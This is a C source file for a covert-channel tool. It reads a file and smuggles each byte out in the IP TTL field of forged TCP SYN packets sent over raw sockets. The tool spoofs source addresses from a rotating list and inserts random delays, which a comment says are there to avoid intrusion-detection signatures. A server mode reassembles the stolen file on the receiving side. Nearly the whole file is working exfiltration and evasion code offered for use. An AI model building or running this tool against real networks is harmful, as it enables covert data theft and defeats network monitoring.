// gcc -o -Wall covert_channel covert_channel.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include "covert_channel.h"

int main(int argc, char **argv)
{
	unsigned int dest_host=UNREAD;
	unsigned short source_port=SOURCE_PORT,dest_port=DEST_PORT;
	int server=UNREAD,file=UNREAD;
	int count;
	char desthost[80],filename[80];

	// Check if the user is capable of running the exe
	if(geteuid() !=0)
	{
		printf("\nYou need to be root to run this.\n\n");
		exit(0);
	}

	// Check validation and if invalid, provide usage
	if((argc < 5) || (argc > 10))
	{
	   usage(argv[0]);
	   exit(0);
	}

	/* No error checking on the args...next version :) */   
	for(count=0; count < argc; ++count)
	{
		if (strcmp(argv[count],"-dest") == 0)
		{
			dest_host=hostConvert(argv[count+1]); 
			strncpy(desthost,argv[count+1],79);
		}
		else if (strcmp(argv[count],"-file") == 0)
		{
			strncpy(filename,argv[count+1],79);
			file=READ;
		}
		else if (strcmp(argv[count],"-source_port") == 0)
			source_port=atoi(argv[count+1]);
		else if (strcmp(argv[count],"-dest_port") == 0)
			dest_port=atoi(argv[count+1]);
		else if (strcmp(argv[count],"-server") == 0)
			server=READ;
    }

	// Start the covert channel
	forgePacket(dest_host, source_port, dest_port
		    	,filename,server);
	exit(0);
}

// Make our own IP and TCP Header
void forgePacket(unsigned int dest_addr, 
					unsigned short source_port, unsigned short dest_port, 
					char *filename, int server) 
{
	int change_value;
	int send_socket, recv_socket;
	int seconds, num_ipaddress = 0;
	char *ipaddressList[] = {"192.168.0.1", "192.168.0.2", "192.168.0.3", "192.168.0.4", 
	"192.168.0.5", "192.168.0.6", "192.168.0.7", "192.168.0.8", "192.168.0.9", "192.168.0.10", "192.168.0.11",
	 "192.168.0.12", "192.168.0.13", "192.168.0.14", "192.168.0.15", "192.168.0.16", "192.168.0.17", 
	 "192.168.0.18", "192.168.0.19", "192.168.0.20"};

	struct sockaddr_in sin;
	FILE *input;
	FILE *output;

	/**********************/
	/* Client Code        */
	/**********************/

	// If server is 0, then we are the client
	if(server==UNREAD)
	{
		if((input=fopen(filename,"rb"))== NULL)
 		{
			printf("I cannot open the file %s for reading\n",filename);
			exit(1);
 		}
		else while((change_value=fgetc(input)) !=EOF)
	 	{
			seconds = ((rand() % 10) + 1);

			// Sleep for 1-10 seconds to avoid IDS signatures
			sleep(seconds);

			// Forge IP Header
			sendPacket.ip.version = 4;
			sendPacket.ip.ihl = 5;
			sendPacket.ip.tos = 0;
			sendPacket.ip.tot_len = htons(40);
			sendPacket.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0));
			sendPacket.ip.frag_off = 0;
			sendPacket.ip.ttl = change_value;
			sendPacket.ip.protocol = IPPROTO_TCP;
			sendPacket.ip.check = 0;
			sendPacket.ip.saddr = hostConvert(ipaddressList[num_ipaddress]);
			sendPacket.ip.daddr = dest_addr;
			

			// Forge TCP Header
			sendPacket.tcp.source = htons(source_port);
			sendPacket.tcp.dest = htons(dest_port);
			sendPacket.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
			sendPacket.tcp.ack_seq = 0;
			sendPacket.tcp.doff = 5;
			sendPacket.tcp.res1 = 0;
			sendPacket.tcp.res2 = 0;
			sendPacket.tcp.urg = 0;
			sendPacket.tcp.ack = 0;
			sendPacket.tcp.psh = 0;
			sendPacket.tcp.rst = 0;
			sendPacket.tcp.syn = 1;
			sendPacket.tcp.fin = 0;
			sendPacket.tcp.window = htons(512);
			sendPacket.tcp.check = 0;
			sendPacket.tcp.urg_ptr = 0;

			// Drop our forged data into the socket struct
			sin.sin_family = AF_INET;
			sin.sin_port = sendPacket.tcp.source;
			sin.sin_addr.s_addr = sendPacket.ip.daddr;   
	   
			// Now open the raw socket for sending
			send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
			if(send_socket == -1)
				abortMsg("Cannot open the send socket. Are you root?");

			// Make IP header checksum 
			sendPacket.ip.check = inCksum((unsigned short *)&sendPacket.ip, 20);

			// Final preparation of the full header
			pseudo_header.source_address = hostConvert(ipaddressList[num_ipaddress]);
			pseudo_header.dest_address = sendPacket.ip.daddr;
			pseudo_header.placeholder = 0;
			pseudo_header.protocol = IPPROTO_TCP;
			pseudo_header.tcp_length = htons(20);

			bcopy((char *)&sendPacket.tcp, (char *)&pseudo_header.tcp, 20);

			// Final checksum on the entire package
			sendPacket.tcp.check = inCksum((unsigned short *)&pseudo_header, 32);

			// Send forged packet
			sendto(send_socket, &sendPacket, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
			printf("Forged IP Address: %s\t|  Sending Data: %c\n", 
					ipaddressList[num_ipaddress], change_value);
			num_ipaddress++;
			num_ipaddress = restartIncrement(num_ipaddress);
	  		close(send_socket);
	 	}
		fclose(input);
	}

	/***********************/
	/* Server Code         */
	/***********************/

	// If server is NOT 0, then we are the server
	else
	{
		if((output=fopen(filename,"wb"))== NULL)
		{
			printf("I cannot open the file %s for writing\n",filename);
			exit(1);
		}

		while(TRUE)
		{
			// Create an open receive socket
			recv_socket = socket(AF_INET, SOCK_RAW, 6);
			if(recv_socket == -1)
			  abortMsg("Cannot open the receive socket. Are you root?");

			// Listen for return packet on a passive socket
			read(recv_socket, (struct recv_tcp *)&recvPacket, 9999);

			// If the packet has the SYN/ACK flag set and is from the right address..
			if((recvPacket.tcp.syn == 1) && (recvPacket.ip.saddr == hostConvert(ipaddressList[num_ipaddress])))
	   		{
				// Decode TTL
				// The TTL number is converted from it's ASCII equivalent back to normal
				printf("Receiving Data: %c\n",recvPacket.ip.ttl);
				fprintf(output,"%c",recvPacket.ip.ttl); 
	   			fflush(output);
			}
			else
		 	{
		  		if((recvPacket.tcp.syn==1) && (ntohs(recvPacket.tcp.dest) == source_port))
		   		{
					// Decode TTL
					// The TTL number is converted from it's ASCII equivalent back to normal
					printf("Receiving Data: %c\n",recvPacket.ip.ttl);
					fprintf(output,"%c",recvPacket.ip.ttl); 
		   			fflush(output);
			 	}
			}
			num_ipaddress++;
			num_ipaddress = restartIncrement(num_ipaddress);
	   		close(recv_socket);
	  	}
	  fclose(output);
	} 
}

unsigned short inCksum(unsigned short *ptr, int nbytes)
{
	register long		sum;		/* assumes long == 32 bits */
	u_short			oddbyte;
	register u_short	answer;		/* assumes u_short == 16 bits */

	/*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

				/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0;		/* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
		sum += oddbyte;
	}

	/*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

	sum  = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;		/* ones-complement, then truncate to 16 bits */
	return(answer);
}

// Generic resolver from unknown source
unsigned int hostConvert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}

// Provide instructions to user
void usage(char *progname)
{
      printf("\nUsage: %s -dest dest_ip -source_port port -dest_port port -file filename -server \n\n", progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("                     In SERVER mode this is the server ip address\n");
      printf("-source_port port  - IP source port you want data to appear from.\n");
      printf("                     If NOT specified, default is port 80.\n");
      printf("-dest_port port    - IP source port you want data to go to. In\n");
      printf("                     SERVER mode this is the port data will be coming\n");
      printf("                     inbound on.\n");
      printf("                     If NOT specified, default is port 80.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("-server            - Server mode to allow receiving of data.\n");
      exit(0);
}

// Restart the increment if it goes over the ipAddressList array
int restartIncrement(int n)
{
	if (n > 19)
		n = 0;
		
	return n;
}

// Prints the error stored in errno and aborts the program.
static void abortMsg(const char* message)
{
    perror (message);
    exit (EXIT_FAILURE);
}
